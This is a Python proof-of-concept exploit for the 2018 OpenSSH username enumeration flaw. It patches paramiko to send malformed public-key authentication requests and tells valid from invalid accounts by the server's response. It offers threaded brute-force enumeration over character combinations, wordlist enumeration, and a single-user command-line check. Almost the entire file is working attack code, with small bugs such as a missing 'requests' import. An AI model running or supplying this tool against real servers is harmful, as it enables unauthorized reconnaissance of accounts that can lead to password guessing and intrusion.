#!/usr/bin/env python

# POC code to take advantage of the OpenSSH username enumeration vulnerability recently discovered (August 2018).
# This approach is threaded and was tested with paramiko version 2.4.1.
# Vulnerability discussed here: http://seclists.org/oss-sec/2018/q3/124

import paramiko
import socket
import threading
import sys
import logging
import itertools
from Queue import Queue
import time

logging.getLogger('paramiko.transport').addHandler(logging.NullHandler())

class InvalidUsername(Exception):
    pass

def userauth_failure(*args, **kwargs):
    raise InvalidUsername()

paramiko.auth_handler.AuthHandler._handler_table.update({paramiko.common.MSG_USERAUTH_FAILURE: userauth_failure})

class SshAuthHandler(paramiko.auth_handler.AuthHandler):
    def _parse_service_accept(self, m):
        service = m.get_text()
        if service == 'ssh-userauth':
            m = paramiko.Message()
            m.add_byte(paramiko.common.cMSG_USERAUTH_REQUEST)
            m.add_string(self.username)
            m.add_string('ssh-connection')
            m.add_string(self.auth_method)
            if self.auth_method == 'publickey':
                #m.add_boolean(True)
                if self.private_key.public_blob:
                    m.add_string(self.private_key.public_blob.key_type)
                    m.add_string(self.private_key.public_blob.key_blob)
                else:
                    m.add_string(self.private_key.get_name())
                    m.add_string(self.private_key)
                blob = self._get_session_blob(
                    self.private_key, 'ssh-connection', self.username)
                sig = self.private_key.sign_ssh_data(blob)
                m.add_string(sig)
            else:
                raise paramiko.SSHException(
                    'Unknown auth method "{}"'.format(self.auth_method))
            self.transport._send_message(m)
        else:
            pass

class SshTransport(paramiko.transport.Transport):
    def auth_publickey(self, username, key, event=None):
        if (not self.active) or (not self.initial_kex_done):
            # we should never try to authenticate unless we're on a secure link
            raise SSHException('No existing session')
        if event is None:
            my_event = threading.Event()
        else:
            my_event = event
        self.auth_handler = SshAuthHandler(self)
        self.auth_handler._handler_table.update({paramiko.common.MSG_SERVICE_ACCEPT: SshAuthHandler._parse_service_accept})
        self.auth_handler.auth_publickey(username, key, my_event)
        if event is not None:
            return []
        return self.auth_handler.wait_for_response(my_event)

def threaded_ssh_isuser(q):
    while True:
        host,username,port = q.get()
        while True:
            try:
                sock = socket.socket()
                sock.connect((host,port))
            except socket.error:
                print("socket error")
                return 0
            try:
                transport = SshTransport(sock)
                transport.start_client()
                break
            except:
                time.sleep(0.2)
        try:
            transport.auth_publickey(username, paramiko.RSAKey.generate(2048))
        except InvalidUsername:
            pass
        except paramiko.ssh_exception.AuthenticationException:
            sys.stdout.write("{}@{}\n".format(username,host))
        q.task_done()

def ssh_bruteforce_usernames(host,minlength=1,maxlength=8,threads=16,port=22):
    queue = Queue()
    
    for index in range(threads):
        thread = threading.Thread(target=threaded_ssh_isuser, args=(queue,))
        thread.setDaemon(True)
        thread.start()
    
    character_list = "abcdefghijklmnopqrstuvwxyz._-"
    #character_list = "tropf"
    for i in range(minlength,maxlength+1):
        for user in itertools.product(character_list,repeat=i):
            user = ''.join(user)
            queue.put((host,user,port))
    queue.join()

def ssh_wordlist_usernames(host,wordlist,threads=16,port=22):
    queue = Queue()
    
    for index in range(threads):
        thread = threading.Thread(target=threaded_ssh_isuser, args=(queue,))
        thread.setDaemon(True)
        thread.start()
    
    if wordlist.startswith("http"):
        wordlist = requests.get(wordlist).text.split()
    else:
        with open(wordlist,"r") as f:
            wordlist = f.read().split()
    for user in wordlist:
        queue.put((host,user,port))
    
    queue.join()

def ssh_isuser(host,username,port=22):
    while True:
        try:
            sock = socket.socket()
            sock.connect((host,port))
        except socket.error:
            print("socket error")
            return 0
        try:
            transport = SshTransport(sock)
            transport.start_client()
            break
        except:
            time.sleep(0.2)
    try:
        transport.auth_publickey(username, paramiko.RSAKey.generate(2048))
    except InvalidUsername:
        return 0
    except paramiko.ssh_exception.AuthenticationException:
        return 1
    return 0

if __name__ == "__main__":
    if len(sys.argv) < 3:
        print("Usage: ./sshuser <username> <host> <port>")
        sys.exit(1)
    username = sys.argv[1]
    host = sys.argv[2]
    port = int(sys.argv[3])
    if ssh_isuser(host,username,port):
        print("{}@{} is a valid user".format(username,host))
    else:
        print("{} not a valid user".format(username))
